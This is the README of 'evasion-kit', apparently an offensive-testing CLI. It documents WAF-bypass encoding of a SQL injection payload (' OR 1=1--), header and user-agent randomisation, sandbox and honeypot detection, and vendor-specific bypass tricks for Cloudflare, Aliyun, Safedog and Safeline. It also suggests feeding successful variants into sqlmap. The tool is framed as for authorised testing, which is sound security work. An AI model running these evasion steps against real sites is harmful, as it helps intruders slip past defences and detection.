# evasion-kit — 对抗规避辅助

授权目标上的 WAF 绕过编码矩阵、UA 轮换、请求头随机化、时序抖动、沙箱/蜜罐检测。

## 快速开始

```bash
# 安装依赖
pip install requests

# 检查
python3 tools/evasion-kit/evasion.py doctor

# 生成 5 个随机 UA
python3 tools/evasion-kit/evasion.py ua-pool --count 5

# 对 payload 生成所有编码变体（针对 cloudflare WAF）
python3 tools/evasion-kit/evasion.py encode --payload "' OR 1=1--" --waf cloudflare

# 在授权目标上测试哪些变体能过 WAF
python3 tools/evasion-kit/evasion.py matrix \
  --url https://授权站/search \
  --payload "' OR 1=1--" \
  --param q \
  --waf cloudflare \
  --case 站点_日期

# 检测蜜罐/沙箱特征
python3 tools/evasion-kit/evasion.py sandbox-detect \
  --url https://授权站 \
  --case 站点_日期

# 生成随机化请求头
python3 tools/evasion-kit/evasion.py headers
```

## 支持的 WAF

| WAF | 专项变体 |
|-----|---------|
| generic | URL 编码、双编码、大写 hex、大小写混淆、换行注入 |
| cloudflare | chunked 分块、路径 dots |
| aliyun / safedog | Unicode 替换 `%u0027` |
| safeline | multipart 绕过 |

## 输出结构

```
案卷/<案卷>/测绘/evasion/
  bypass_matrix.json      WAF 绕过矩阵结果
  sandbox_detect.json     蜜罐/沙箱检测结果
```

## 与其他工具联动

- 命中 bypass 变体 → 带入 `sqlmap --tamper` 或手动利用
- sandbox 检测 suspicious → 调整侦察强度，换更慢的扫描策略
- `random_headers()` 可直接在其他 Python 脚本中 `from evasion import random_headers`
